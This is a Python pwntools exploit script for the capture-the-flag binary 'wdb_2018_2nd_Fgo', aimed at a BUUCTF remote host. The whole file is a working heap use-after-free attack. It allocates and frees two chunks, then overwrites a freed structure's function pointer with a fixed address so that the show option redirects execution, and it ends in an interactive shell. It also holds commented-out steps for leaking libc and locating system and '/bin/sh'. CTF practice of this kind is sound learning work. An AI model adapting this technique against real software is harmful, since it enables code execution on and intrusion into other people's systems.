import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='wdb_2018_2nd_Fgo'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/i386-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',27947)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('Your choice:','1')
			io.sendlineafter("the size of servant's name :",str(a))
			io.sendafter('ability : ',c)

		def delete(a):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('Index :',str(a))


		def show(a):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('Index :',str(a))

		add(0x10,'a')
		add(0x10,'a')
		delete(0)
		delete(1)
		add(0x8,p32(0x08048956))
		show(0)
		


		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue